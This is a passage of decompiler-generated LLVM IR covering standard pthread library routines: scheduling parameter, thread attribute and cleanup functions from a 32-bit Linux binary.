  store i32 %v3_804dc4a, i32* @ebx, align 4
  %v1_804dc4d = icmp eq i32 %v3_804dc4a, 0
  br i1 %v1_804dc4d, label %dec_label_pc_804dc56, label %dec_label_pc_804dc51

dec_label_pc_804dc51:                             ; preds = %entry
  %v1_804dc51 = add i32 %v3_804dc4a, 16
  %v2_804dc51 = inttoptr i32 %v1_804dc51 to i32*
  %v3_804dc51 = load i32, i32* %v2_804dc51, align 4
  %v4_804dc51 = load i32, i32* @edi, align 4
  %v15_804dc51 = icmp eq i32 %v3_804dc51, %v4_804dc51
  br i1 %v15_804dc51, label %dec_label_pc_804dc66, label %dec_label_pc_804dc56

dec_label_pc_804dc56:                             ; preds = %dec_label_pc_804dc51, %entry
  %v1_804dc5a = inttoptr i32 %v0_804dc4a to i32*
  %v2_804dc5a = call i32 @__pthread_unlock(i32* %v1_804dc5a)
  br label %dec_label_pc_804dcbf

dec_label_pc_804dc66:                             ; preds = %dec_label_pc_804dc51
  %v1_804dc6c = add i32 %v3_804dc4a, 20
  %v2_804dc6c = inttoptr i32 %v1_804dc6c to i32*
  %v3_804dc6c = load i32, i32* %v2_804dc6c, align 4
  %v3_804dc6f = call i32 @sched_setscheduler(i32 %v3_804dc6c, i32 %tmp5, i32 %v4_804dc51)
  %v8_804dc77 = icmp eq i32 %v3_804dc6f, -1
  %v1_804dc78 = icmp eq i1 %v8_804dc77, false
  br i1 %v1_804dc78, label %dec_label_pc_804dc8c, label %dec_label_pc_804dc7a

dec_label_pc_804dc7a:                             ; preds = %dec_label_pc_804dc66
  %v0_804dc7d = load i32, i32* @esi, align 4
  %v1_804dc7e = inttoptr i32 %v0_804dc7d to i32*
  %v2_804dc7e = call i32 @__pthread_unlock(i32* %v1_804dc7e)
  %v1_804dc83 = call i32 @__errno_location(i32 %v0_804dc7d)
  %v1_804dc88 = inttoptr i32 %v1_804dc83 to i32*
  %v2_804dc88 = load i32, i32* %v1_804dc88, align 4
  br label %dec_label_pc_804dcbf

dec_label_pc_804dc8c:                             ; preds = %dec_label_pc_804dc66
  %v1_804dc8e = icmp eq i32 %arg2, 0
  br i1 %v1_804dc8e, label %dec_label_pc_804dc98, label %dec_label_pc_804dc92

dec_label_pc_804dc92:                             ; preds = %dec_label_pc_804dc8c
  %v2_804dc96 = load i32, i32* %arg3, align 4
  br label %dec_label_pc_804dc98

dec_label_pc_804dc98:                             ; preds = %dec_label_pc_804dc8c, %dec_label_pc_804dc92
  %v0_804dc9b = phi i32 [ 0, %dec_label_pc_804dc8c ], [ %v2_804dc96, %dec_label_pc_804dc92 ]
  %v2_804dc9b = add i32 %v3_804dc4a, 24
  %v3_804dc9b = inttoptr i32 %v2_804dc9b to i32*
  store i32 %v0_804dc9b, i32* %v3_804dc9b, align 4
  %v0_804dc9e = load i32, i32* @esi, align 4
  %v1_804dc9f = inttoptr i32 %v0_804dc9e to i32*
  %v2_804dc9f = call i32 @__pthread_unlock(i32* %v1_804dc9f)
  %v0_804dca9 = load i32, i32* @global_var_80626e4.143, align 4
  %v2_804dca9 = icmp slt i32 %v0_804dca9, 0
  br i1 %v2_804dca9, label %dec_label_pc_804dcc2, label %dec_label_pc_804dcb2

dec_label_pc_804dcb2:                             ; preds = %dec_label_pc_804dc98
  %v3_804dcb5 = load i32, i32* %v3_804dc9b, align 4
  %v1_804dcb8 = call i32 @__pthread_manager_adjust_prio(i32 %v3_804dcb5)
  br label %dec_label_pc_804dcbf

dec_label_pc_804dcbf:                             ; preds = %dec_label_pc_804dc7a, %dec_label_pc_804dc56, %dec_label_pc_804dcb2
  %v0_804dcc94 = phi i32 [ %v2_804dc88, %dec_label_pc_804dc7a ], [ 3, %dec_label_pc_804dc56 ], [ 0, %dec_label_pc_804dcb2 ]
  br label %dec_label_pc_804dcc2

dec_label_pc_804dcc2:                             ; preds = %dec_label_pc_804dc98, %dec_label_pc_804dcbf
  %v0_804dcc9 = phi i32 [ 0, %dec_label_pc_804dc98 ], [ %v0_804dcc94, %dec_label_pc_804dcbf ]
  ret i32 %v0_804dcc9

; uselistorder directives
  uselistorder i32 %v4_804dc51, { 1, 0 }
  uselistorder i32 %v3_804dc4a, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32)* @__pthread_manager_adjust_prio, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804dcc2, { 1, 0 }
  uselistorder label %dec_label_pc_804dcbf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804dc98, { 1, 0 }
}

define i32 @__GI_pthread_getschedparam(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804dccb = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804dcd7 = urem i32 %arg1, 1024
  %v2_804dcdc = mul nuw nsw i32 %v1_804dcd7, 16
  %v1_804dcdf = add i32 %v2_804dcdc, ptrtoint (i32* @global_var_805e300.147 to i32)
  store i32 %v1_804dcdf, i32* @ebx, align 4
  store i32 %v1_804dcdf, i32* @eax, align 4
  %v1_804dce7 = call i32 @__pthread_lock(i32 %v0_804dccb)
  %v0_804dcec = load i32, i32* @ebx, align 4
  %v1_804dcec = add i32 %v0_804dcec, 8
  %v2_804dcec = inttoptr i32 %v1_804dcec to i32*
  %v3_804dcec = load i32, i32* %v2_804dcec, align 4
  %v1_804dcef = icmp eq i32 %v3_804dcec, 0
  br i1 %v1_804dcef, label %dec_label_pc_804dcf8, label %dec_label_pc_804dcf3

dec_label_pc_804dcf3:                             ; preds = %entry
  %v1_804dcf3 = add i32 %v3_804dcec, 16
  %v2_804dcf3 = inttoptr i32 %v1_804dcf3 to i32*
  %v3_804dcf3 = load i32, i32* %v2_804dcf3, align 4
  %v4_804dcf3 = load i32, i32* @esi, align 4
  %v15_804dcf3 = icmp eq i32 %v3_804dcf3, %v4_804dcf3
  br i1 %v15_804dcf3, label %dec_label_pc_804dd0b, label %dec_label_pc_804dcf8

dec_label_pc_804dcf8:                             ; preds = %dec_label_pc_804dcf3, %entry
  store i32 %v0_804dcec, i32* %stack_var_-28, align 4
  %v1_804dcfc = inttoptr i32 %v0_804dcec to i32*
  %v2_804dcfc = call i32 @__pthread_unlock(i32* %v1_804dcfc)
  br label %dec_label_pc_804dd4c

dec_label_pc_804dd0b:                             ; preds = %dec_label_pc_804dcf3
  %v1_804dd0e = add i32 %v3_804dcec, 20
  %v2_804dd0e = inttoptr i32 %v1_804dd0e to i32*
  %v3_804dd0e = load i32, i32* %v2_804dd0e, align 4
  store i32 %v3_804dd0e, i32* @esi, align 4
  store i32 %v0_804dcec, i32* %stack_var_-28, align 4
  %v1_804dd12 = inttoptr i32 %v0_804dcec to i32*
  %v2_804dd12 = call i32 @__pthread_unlock(i32* %v1_804dd12)
  %v0_804dd17 = load i32, i32* @esi, align 4
  store i32 %v0_804dd17, i32* %stack_var_-28, align 4
  %v1_804dd1a = call i32 @sched_getscheduler(i32 %v0_804dd17)
  store i32 %v1_804dd1a, i32* @ebx, align 4
  %v10_804dd24 = icmp eq i32 %v1_804dd1a, -1
  br i1 %v10_804dd24, label %dec_label_pc_804dd3b, label %dec_label_pc_804dd29

dec_label_pc_804dd29:                             ; preds = %dec_label_pc_804dd0b
  %v0_804dd29 = load i32, i32* @ecx, align 4
  %v0_804dd2f = load i32, i32* @esi, align 4
  store i32 %v0_804dd2f, i32* %stack_var_-28, align 4
  %v4_804dd30 = call i32 @sched_getparam(i32 %v0_804dd2f, i32 %arg3, i32 %v0_804dd29, i32 %v0_804dd29)
  %v8_804dd38 = icmp eq i32 %v4_804dd30, -1
  %v1_804dd39 = icmp eq i1 %v8_804dd38, false
  br i1 %v1_804dd39, label %dec_label_pc_804dd44, label %dec_label_pc_804dd3b

dec_label_pc_804dd3b:                             ; preds = %dec_label_pc_804dd29, %dec_label_pc_804dd0b
  %v0_804dd3b = load i32, i32* %stack_var_-28, align 4
  %v1_804dd3b = call i32 @__errno_location(i32 %v0_804dd3b)
  %v1_804dd40 = inttoptr i32 %v1_804dd3b to i32*
  %v2_804dd40 = load i32, i32* %v1_804dd40, align 4
  br label %dec_label_pc_804dd4c

dec_label_pc_804dd44:                             ; preds = %dec_label_pc_804dd29
  %v0_804dd48 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd48, i32* %arg2, align 4
  br label %dec_label_pc_804dd4c

dec_label_pc_804dd4c:                             ; preds = %dec_label_pc_804dd3b, %dec_label_pc_804dcf8, %dec_label_pc_804dd44
  %v0_804dd4f = phi i32 [ %v2_804dd40, %dec_label_pc_804dd3b ], [ 3, %dec_label_pc_804dcf8 ], [ 0, %dec_label_pc_804dd44 ]
  ret i32 %v0_804dd4f

; uselistorder directives
  uselistorder i32 %v0_804dcec, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_804dd4c, { 2, 0, 1 }
}

define i32 @pthread_attr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_attr_setdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = or i32 %arg2, 1
  %tmp4 = icmp eq i32 %tmp3, 1
  br i1 %tmp4, label %dec_label_pc_804dd61, label %dec_label_pc_804dd69

dec_label_pc_804dd61:                             ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_804dd69

dec_label_pc_804dd69:                             ; preds = %entry, %dec_label_pc_804dd61
  %v0_804dd69 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804dd61 ]
  ret i32 %v0_804dd69

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804dd69, { 1, 0 }
}

define i32 @__GI_pthread_attr_getdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_804dd6e = load i32, i32* %arg1, align 4
  %v2_804dd74 = inttoptr i32 %arg2 to i32*
  store i32 %v2_804dd6e, i32* %v2_804dd74, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedpolicy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_804dd85 = icmp ugt i32 %arg2, 2
  br i1 %v6_804dd85, label %dec_label_pc_804dd90, label %dec_label_pc_804dd87

dec_label_pc_804dd87:                             ; preds = %entry
  %v2_804dd8b = add i32 %arg1, 4
  %v3_804dd8b = inttoptr i32 %v2_804dd8b to i32*
  store i32 %arg2, i32* %v3_804dd8b, align 4
  br label %dec_label_pc_804dd90

dec_label_pc_804dd90:                             ; preds = %entry, %dec_label_pc_804dd87
  %v0_804dd90 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804dd87 ]
  ret i32 %v0_804dd90

; uselistorder directives
  uselistorder label %dec_label_pc_804dd90, { 1, 0 }
}

define i32 @pthread_attr_getschedpolicy(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804dd95 = add i32 %arg1, 4
  %v2_804dd95 = inttoptr i32 %v1_804dd95 to i32*
  %v3_804dd95 = load i32, i32* %v2_804dd95, align 4
  store i32 %v3_804dd95, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setinheritsched(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = or i32 %arg2, 1
  %tmp4 = icmp eq i32 %tmp3, 1
  br i1 %tmp4, label %dec_label_pc_804ddaf, label %dec_label_pc_804ddb8

dec_label_pc_804ddaf:                             ; preds = %entry
  %v2_804ddb3 = add i32 %arg1, 12
  %v3_804ddb3 = inttoptr i32 %v2_804ddb3 to i32*
  store i32 %arg2, i32* %v3_804ddb3, align 4
  br label %dec_label_pc_804ddb8

dec_label_pc_804ddb8:                             ; preds = %entry, %dec_label_pc_804ddaf
  %v0_804ddb8 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804ddaf ]
  ret i32 %v0_804ddb8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804ddb8, { 1, 0 }
}

define i32 @pthread_attr_getinheritsched(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804ddbd = add i32 %arg1, 12
  %v2_804ddbd = inttoptr i32 %v1_804ddbd to i32*
  %v3_804ddbd = load i32, i32* %v2_804ddbd, align 4
  store i32 %v3_804ddbd, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setscope(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804ddcd = icmp eq i32 %arg2, 0
  br i1 %v1_804ddcd, label %dec_label_pc_804dde0, label %dec_label_pc_804ddd1

dec_label_pc_804ddd1:                             ; preds = %entry
  %v8_804ddd1 = icmp eq i32 %arg2, 1
  %v1_804dddc = select i1 %v8_804ddd1, i32 95, i32 22
  ret i32 %v1_804dddc

dec_label_pc_804dde0:                             ; preds = %entry
  %v1_804dde4 = add i32 %arg1, 16
  %v2_804dde4 = inttoptr i32 %v1_804dde4 to i32*
  store i32 0, i32* %v2_804dde4, align 4
  ret i32 0
}

define i32 @pthread_attr_getscope(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804ddf2 = add i32 %arg1, 16
  %v2_804ddf2 = inttoptr i32 %v1_804ddf2 to i32*
  %v3_804ddf2 = load i32, i32* %v2_804ddf2, align 4
  store i32 %v3_804ddf2, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_getguardsize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804de02 = add i32 %arg1, 20
  %v2_804de02 = inttoptr i32 %v1_804de02 to i32*
  %v3_804de02 = load i32, i32* %v2_804de02, align 4
  store i32 %v3_804de02, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstackaddr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_804de16 = add i32 %arg1, 28
  %v3_804de16 = inttoptr i32 %v2_804de16 to i32*
  store i32 %arg2, i32* %v3_804de16, align 4
  %v0_804de1b = load i32, i32* %edx.global-to-local, align 4
  %v1_804de1b = add i32 %v0_804de1b, 24
  %v2_804de1b = inttoptr i32 %v1_804de1b to i32*
  store i32 1, i32* %v2_804de1b, align 4
  ret i32 0
}

define i32 @__pthread_attr_getstackaddr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804de27 = add i32 %arg1, 28
  %v2_804de27 = inttoptr i32 %v1_804de27 to i32*
  %v3_804de27 = load i32, i32* %v2_804de27, align 4
  store i32 %v3_804de27, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstacksize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp ult i32 %arg2, 16384
  br i1 %tmp3, label %dec_label_pc_804de4d, label %dec_label_pc_804de44

dec_label_pc_804de44:                             ; preds = %entry
  %v2_804de48 = add i32 %arg1, 32
  %v3_804de48 = inttoptr i32 %v2_804de48 to i32*
  store i32 %arg2, i32* %v3_804de48, align 4
  br label %dec_label_pc_804de4d

dec_label_pc_804de4d:                             ; preds = %entry, %dec_label_pc_804de44
  %v0_804de4d = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804de44 ]
  ret i32 %v0_804de4d

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804de4d, { 1, 0 }
}

define i32 @__pthread_attr_getstacksize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804de52 = add i32 %arg1, 32
  %v2_804de52 = inttoptr i32 %v1_804de52 to i32*
  %v3_804de52 = load i32, i32* %v2_804de52, align 4
  store i32 %v3_804de52, i32* %arg2, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_init(i32* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de5e = load i32, i32* @ebx, align 4
  store i32 %v0_804de5e, i32* %stack_var_-4, align 4
  %v1_804de62 = call i32 @__GI_getpagesize(i32 %v0_804de5e)
  store i32 %tmp1, i32* %ebx.global-to-local, align 4
  %v2_804de70 = sub i32 2097152, %v1_804de62
  store i32 %v2_804de70, i32* %edx.global-to-local, align 4
  %v2_804de72 = add i32 %tmp1, 20
  %v3_804de72 = inttoptr i32 %v2_804de72 to i32*
  store i32 %v1_804de62, i32* %v3_804de72, align 4
  %v0_804de75 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de75 = inttoptr i32 %v0_804de75 to i32*
  store i32 0, i32* %v1_804de75, align 4
  %v0_804de7b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de7b = add i32 %v0_804de7b, 4
  %v2_804de7b = inttoptr i32 %v1_804de7b to i32*
  store i32 0, i32* %v2_804de7b, align 4
  %v0_804de82 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de82 = add i32 %v0_804de82, 8
  %v2_804de82 = inttoptr i32 %v1_804de82 to i32*
  store i32 0, i32* %v2_804de82, align 4
  %v0_804de89 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de89 = add i32 %v0_804de89, 12
  %v2_804de89 = inttoptr i32 %v1_804de89 to i32*
  store i32 1, i32* %v2_804de89, align 4
  %v0_804de90 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de90 = add i32 %v0_804de90, 16
  %v2_804de90 = inttoptr i32 %v1_804de90 to i32*
  store i32 0, i32* %v2_804de90, align 4
  %v0_804de97 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de97 = add i32 %v0_804de97, 28
  %v2_804de97 = inttoptr i32 %v1_804de97 to i32*
  store i32 0, i32* %v2_804de97, align 4
  %v0_804de9e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de9e = add i32 %v0_804de9e, 24
  %v2_804de9e = inttoptr i32 %v1_804de9e to i32*
  store i32 0, i32* %v2_804de9e, align 4
  %v0_804dea5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dea5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804dea5 = add i32 %v1_804dea5, 32
  %v3_804dea5 = inttoptr i32 %v2_804dea5 to i32*
  store i32 %v0_804dea5, i32* %v3_804dea5, align 4
  %v2_804deaa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804deaa, i32* %edx.global-to-local, align 4
  %v2_804deac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804deac, i32* %ebx.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 2097152, { 1, 0, 3, 2 }
}

define i32 @__pthread_attr_setguardsize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804deaf = load i32, i32* @ebx, align 4
  %v1_804deb3 = call i32 @__GI_getpagesize(i32 %v0_804deaf)
  %v3_804dec2 = add i32 %arg2, -1
  %v4_804dec2 = add i32 %v3_804dec2, %v1_804deb3
  %tmp7 = urem i32 %v4_804dec2, %v1_804deb3
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804ded3 = sub i32 %v4_804dec2, %tmp7
  %v2_804ded6 = add i32 %arg1, 32
  %v3_804ded6 = inttoptr i32 %v2_804ded6 to i32*
  %v4_804ded6 = load i32, i32* %v3_804ded6, align 4
  %v10_804ded6 = icmp ult i32 %v4_804ded3, %v4_804ded6
  %v1_804ded9 = icmp eq i1 %v10_804ded6, false
  br i1 %v1_804ded9, label %dec_label_pc_804dee0, label %dec_label_pc_804dedb

dec_label_pc_804dedb:                             ; preds = %entry
  %v2_804dedb = add i32 %arg1, 20
  %v3_804dedb = inttoptr i32 %v2_804dedb to i32*
  store i32 %v4_804ded3, i32* %v3_804dedb, align 4
  %v10_804dede = load i32, i32* %eax.global-to-local, align 4
  %v11_804dede = and i32 %v10_804dede, -256
  store i32 %v11_804dede, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dee0

dec_label_pc_804dee0:                             ; preds = %entry, %dec_label_pc_804dedb
  %v0_804dee3 = phi i32 [ 22, %entry ], [ %v11_804dede, %dec_label_pc_804dedb ]
  ret i32 %v0_804dee3

; uselistorder directives
  uselistorder label %dec_label_pc_804dee0, { 1, 0 }
}

define i32 @__GI_pthread_attr_getschedparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804deed = add i32 %arg1, 8
  %v3_804def5 = inttoptr i32 %arg2 to i16*
  %v4_804def5 = call i32 @memcpy(i16* %v3_804def5, i32 %v1_804deed, i32 4)
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedparam(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  %v1_804df0e = add i32 %arg1, 4
  %v2_804df0e = inttoptr i32 %v1_804df0e to i32*
  %v3_804df0e = load i32, i32* %v2_804df0e, align 4
  %v1_804df11 = call i32 @sched_get_priority_max(i32 %v3_804df0e)
  store i32 %v1_804df11, i32* @ebx, align 4
  %v0_804df19 = load i32, i32* @esi, align 4
  %v1_804df19 = add i32 %v0_804df19, 4
  %v2_804df19 = inttoptr i32 %v1_804df19 to i32*
  %v3_804df19 = load i32, i32* %v2_804df19, align 4
  %v1_804df1c = call i32 @sched_get_priority_min(i32 %v3_804df19)
  %v0_804df21 = load i32, i32* @edi, align 4
  %v1_804df21 = inttoptr i32 %v0_804df21 to i32*
  %v2_804df21 = load i32, i32* %v1_804df21, align 4
  %v5_804df28 = icmp slt i32 %v2_804df21, %v1_804df1c
  br i1 %v5_804df28, label %dec_label_pc_804df42, label %dec_label_pc_804df2a

dec_label_pc_804df2a:                             ; preds = %entry
  %v1_804df2a = load i32, i32* @ebx, align 4
  %v8_804df2c = icmp sgt i32 %v2_804df21, %v1_804df2a
  br i1 %v8_804df2c, label %dec_label_pc_804df42, label %dec_label_pc_804df2e

dec_label_pc_804df2e:                             ; preds = %dec_label_pc_804df2a
  %v0_804df2f = load i32, i32* @esi, align 4
  %v1_804df2f = add i32 %v0_804df2f, 8
  %v3_804df36 = inttoptr i32 %v1_804df2f to i16*
  %v4_804df36 = call i32 @memcpy(i16* %v3_804df36, i32 %v0_804df21, i32 4)
  br label %dec_label_pc_804df47

dec_label_pc_804df42:                             ; preds = %dec_label_pc_804df2a, %entry
  br label %dec_label_pc_804df47

dec_label_pc_804df47:                             ; preds = %dec_label_pc_804df2e, %dec_label_pc_804df42
  %v0_804df4a = phi i32 [ 0, %dec_label_pc_804df2e ], [ 22, %dec_label_pc_804df42 ]
  ret i32 %v0_804df4a

; uselistorder directives
  uselistorder label %dec_label_pc_804df47, { 1, 0 }
}

define i32 @thread_self.8(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_804df4c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_804df4c, i32* @edx, align 4
  %v0_804df53 = load i32, i32* @esp, align 4
  %v1_804df53 = load i32, i32* @global_var_8062fec.134, align 4
  %v7_804df53 = icmp ult i32 %v0_804df53, %v1_804df53
  %v1_804df59 = icmp eq i1 %v7_804df53, false
  br i1 %v1_804df59, label %dec_label_pc_804df8a, label %dec_label_pc_804df5b

dec_label_pc_804df5b:                             ; preds = %entry
  %v1_804df5b = load i32, i32* @global_var_8062ff0.135, align 16
  %v7_804df5b = icmp ult i32 %v0_804df53, %v1_804df5b
  br i1 %v7_804df5b, label %dec_label_pc_804df70, label %dec_label_pc_804df63

dec_label_pc_804df63:                             ; preds = %dec_label_pc_804df5b
  %v1_804df68 = load i32, i32* @global_var_8062ff4.137, align 4
  %v7_804df68 = icmp ult i32 %v0_804df53, %v1_804df68
  br i1 %v7_804df68, label %dec_label_pc_804df8a, label %dec_label_pc_804df70

dec_label_pc_804df70:                             ; preds = %dec_label_pc_804df63, %dec_label_pc_804df5b
  %v0_804df70 = load i32, i32* @global_var_8067650.138, align 16
  %v1_804df70 = icmp eq i32 %v0_804df70, 0
  br i1 %v1_804df70, label %dec_label_pc_804df7e, label %dec_label_pc_804df79

dec_label_pc_804df79:                             ; preds = %dec_label_pc_804df70
  %v0_804df79 = call i32 @__pthread_find_self()
  br label %dec_label_pc_804df7e

dec_label_pc_804df7e:                             ; preds = %dec_label_pc_804df70, %dec_label_pc_804df79
  %v3_804df7e = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_804df7e, i32* @edx, align 4
  %v2_804df84 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804df8a

dec_label_pc_804df8a:                             ; preds = %dec_label_pc_804df63, %entry, %dec_label_pc_804df7e
  %v0_804df8a = phi i32 [ ptrtoint (i32* @global_var_8062500.136 to i32), %dec_label_pc_804df63 ], [ ptrtoint (i32* @global_var_8062320 to i32), %entry ], [ %v2_804df84, %dec_label_pc_804df7e ]
  ret i32 %v0_804df8a

; uselistorder directives
  uselistorder label %dec_label_pc_804df8a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804df7e, { 1, 0 }
}

define i32 @__pthread_perform_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804df8b = load i32, i32* @edi, align 4
  %v0_804df8c = load i32, i32* @esi, align 4
  %v0_804df8d = load i32, i32* @ebx, align 4
  store i32 %v0_804df8d, i32* %stack_var_-12, align 4
  %v1_804df8e = call i32 @thread_self.8(i32 %v0_804df8d)
  store i32 %v1_804df8e, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %v1_804df8e, i32* %esi.global-to-local, align 4
  %v1_804df99 = add i32 %v1_804df8e, 60
  %v2_804df99 = inttoptr i32 %v1_804df99 to i32*
  %v3_804df99 = load i32, i32* %v2_804df99, align 4
  store i32 %v3_804df99, i32* %ebx.global-to-local, align 4
  %v1_804dfb02 = icmp eq i32 %v3_804df99, 0
  %v1_804dfb29 = icmp eq i1 %v1_804dfb02, false
  br i1 %v1_804dfb29, label %dec_label_pc_804df9e.lr.ph, label %dec_label_pc_804dfb4

dec_label_pc_804df9e.lr.ph:                       ; preds = %entry
  %tmp = icmp ugt i32 %v3_804df99, %arg1
  br i1 %tmp, label %dec_label_pc_804dfa2.lr.ph, label %dec_label_pc_804dfb4.loopexit

dec_label_pc_804dfa2.lr.ph:                       ; preds = %dec_label_pc_804df9e.lr.ph
  br label %dec_label_pc_804dfa2

dec_label_pc_804dfa2:                             ; preds = %dec_label_pc_804dfa2.dec_label_pc_804df9e_crit_edge, %dec_label_pc_804dfa2.lr.ph
  %v4_804dfa829 = phi i32 [ %v3_804df99, %dec_label_pc_804dfa2.lr.ph ], [ %v3_804dfaa, %dec_label_pc_804dfa2.dec_label_pc_804df9e_crit_edge ]
  %v5_804dfa8 = inttoptr i32 %v4_804dfa829 to i32*
  %v6_804dfa8 = load i32, i32* %v5_804dfa8, align 4
  call void @__pseudo_call(i32 %v6_804dfa8)
  %v0_804dfaa = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dfaa = add i32 %v0_804dfaa, 12
  %v2_804dfaa = inttoptr i32 %v1_804dfaa to i32*
  %v3_804dfaa = load i32, i32* %v2_804dfaa, align 4
  store i32 %v3_804dfaa, i32* %ebx.global-to-local, align 4
  %v1_804dfb0 = icmp eq i32 %v3_804dfaa, 0
  %v1_804dfb2 = icmp eq i1 %v1_804dfb0, false
  br i1 %v1_804dfb2, label %dec_label_pc_804dfa2.dec_label_pc_804df9e_crit_edge, label %dec_label_pc_804dfb4.loopexit

dec_label_pc_804dfa2.dec_label_pc_804df9e_crit_edge: ; preds = %dec_label_pc_804dfa2
  %v1_804df9e.pre = load i32, i32* %edi.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v3_804dfaa, %v1_804df9e.pre
  br i1 %tmp32, label %dec_label_pc_804dfa2, label %dec_label_pc_804dfb4.loopexit

dec_label_pc_804dfb4.loopexit:                    ; preds = %dec_label_pc_804dfa2.dec_label_pc_804df9e_crit_edge, %dec_label_pc_804df9e.lr.ph, %dec_label_pc_804dfa2
  %v0_804dfb4.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804dfb4

dec_label_pc_804dfb4:                             ; preds = %dec_label_pc_804dfb4.loopexit, %entry
  %v0_804dfb4 = phi i32 [ %v0_804dfb4.pre, %dec_label_pc_804dfb4.loopexit ], [ %v1_804df8e, %entry ]
  %v1_804dfb4 = add i32 %v0_804dfb4, 372
  %v2_804dfb4 = inttoptr i32 %v1_804dfb4 to i32*
  %v3_804dfb4 = load i32, i32* %v2_804dfb4, align 4
  %v4_804dfb4 = icmp eq i32 %v3_804dfb4, 0
  br i1 %v4_804dfb4, label %dec_label_pc_804dfb4.dec_label_pc_804dfc5_crit_edge, label %dec_label_pc_804dfbd

dec_label_pc_804dfb4.dec_label_pc_804dfc5_crit_edge: ; preds = %dec_label_pc_804dfb4
  %v0_804dfc8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dfc5

dec_label_pc_804dfbd:                             ; preds = %dec_label_pc_804dfb4
  %v2_804dfbd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dfbd, i32* @ebx, align 4
  store i32 %v0_804df8c, i32* @esi, align 4
  store i32 %v0_804df8b, i32* @edi, align 4
  %v0_804dfc0 = call i32 @__rpc_thread_destroy()
